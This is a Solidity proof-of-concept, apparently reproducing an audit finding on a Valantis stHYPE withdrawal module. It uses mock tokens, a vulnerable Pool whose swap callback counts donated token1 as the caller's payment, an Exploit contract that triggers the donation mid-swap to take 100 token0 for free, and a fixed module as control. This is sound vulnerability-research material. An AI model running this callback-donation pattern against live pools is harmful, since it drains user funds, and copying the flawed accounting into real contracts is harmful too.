// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Valantis stHYPEWithdrawalModule.update (Hexens, 2025-03).
    A swap callback counts any token1 that arrives during the call as
    the caller's payment. update() wraps 100 of surplus and transfers
    it straight to the pool. The caller receives 100 token0 and pays 0.
    The control refuses update() while the pool is inside swap, so the
    surplus stays put and a normal swap has to pay its own 100.
*/

interface ICallback {
    function onSwap(uint256 amountOut) external;
}

contract Token0 {
    string public symbol = "stHYPE";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract Token1 {
    string public symbol = "WHYPE";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract Pool {
    Token0 public token0;
    Token1 public token1;
    bool public inSwap;
    uint256 public preBalance;
    bool public callbackUsed;
    uint256 public received;
    uint256 public lastOut;

    constructor(Token0 t0, Token1 t1) {
        token0 = t0;
        token1 = t1;
    }

    function swap(uint256 amountOut, bool isSwapCallback) external returns (uint256) {
        inSwap = true;
        uint256 pre = token1.balanceOf(address(this));
        preBalance = pre;
        if (isSwapCallback) {
            callbackUsed = true;
            ICallback(msg.sender).onSwap(amountOut);
        } else {
            token1.transferFrom(msg.sender, address(this), amountOut);
        }
        uint256 got = token1.balanceOf(address(this)) - pre;
        received = got; // @> VULN: token1 sent by update() during the callback counts as the caller's payment
        require(got >= amountOut, "unpaid");
        token0.transfer(msg.sender, amountOut);
        inSwap = false;
        lastOut = amountOut;
        return amountOut;
    }
}

contract Module {
    Pool public pool;
    Token1 public token1;
    uint256 public surplusLeft;
    uint256 public wrapped;
    bool public donated;

    constructor(Pool _pool, Token1 _token1) {
        pool = _pool;
        token1 = _token1;
    }

    receive() external payable {}

    function update() external {
        uint256 bal = address(this).balance;
        uint256 surplus = bal;
        surplusLeft = surplus;
        token1.deposit{value: surplus}();
        wrapped = surplus;
        token1.transfer(address(pool), surplus);
        donated = true;
    }
}

contract ModuleFixed {
    Pool public pool;
    Token1 public token1;

    constructor(Pool _pool, Token1 _token1) {
        pool = _pool;
        token1 = _token1;
    }

    receive() external payable {}

    function update() external {
        require(!pool.inSwap(), "in swap");
        uint256 surplus = address(this).balance;
        token1.deposit{value: surplus}();
        token1.transfer(address(pool), surplus);
    }
}

contract Exploit is ICallback {
    uint256 public constant AMOUNT = 100 ether;
    address public constant ATTACKER = 0x1111111111111111111111111111111111111111;

    Token0 public token0;
    Token1 public token1;
    Pool public pool;
    Module public module;

    function run() external payable {
        token0 = new Token0();
        token1 = new Token1();
        pool = new Pool(token0, token1);
        token0.mint(address(pool), AMOUNT);
        module = new Module(pool, token1);
        (bool ok,) = address(module).call{value: msg.value}("");
        require(ok, "fund");
        uint256 out = pool.swap(AMOUNT, true);
        require(out == AMOUNT, "took 100");
        require(token1.balanceOf(ATTACKER) == 0, "paid nothing");
        token0.transfer(ATTACKER, token0.balanceOf(address(this)));
        require(token0.balanceOf(ATTACKER) == AMOUNT, "attacker holds 100");
        require(address(module).balance == 0, "surplus consumed");
    }

    function onSwap(uint256) external {
        require(msg.sender == address(pool), "pool");
        module.update();
    }
}
